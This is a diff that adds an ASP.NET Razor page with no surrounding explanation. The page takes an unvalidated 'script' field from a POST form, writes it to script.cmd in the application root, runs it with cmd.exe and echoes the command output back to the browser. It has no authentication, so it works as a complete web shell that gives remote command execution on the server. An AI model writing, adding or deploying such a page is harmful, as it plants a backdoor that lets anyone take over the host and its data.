@@ -1,0 +1,45 @@
+﻿@using System.Diagnostics;
+
+@{
+    string script = Request.Unvalidated("script");
+    var output = new System.Text.StringBuilder();
+
+    if (!String.IsNullOrEmpty(script))
+    {
+        string path = Server.MapPath("~/script.cmd");
+        File.WriteAllText(path, script);
+
+        var process = new Process();
+
+        var startInfo = new ProcessStartInfo
+        {
+            FileName = "cmd.exe",
+            Arguments = "/c script.cmd",
+            WorkingDirectory = HttpRuntime.AppDomainAppPath,
+            RedirectStandardOutput = true,
+            RedirectStandardError = true,
+            UseShellExecute = false
+        };
+
+        process.StartInfo = startInfo;
+
+        process.OutputDataReceived += (sender, args) => output.AppendLine(args.Data);
+        process.ErrorDataReceived += (sender, args) => output.AppendLine(args.Data);
+
+        process.Start();
+        process.BeginOutputReadLine();
+        process.BeginErrorReadLine();
+        process.WaitForExit();
+    }
+}
+
+@(1+1)
+
+<form action="." method="post">
+    <textarea cols="80" rows="20" name="script">@script</textarea>
+    <input type="submit">
+</form>
+
+<pre>
+@output
+</pre>
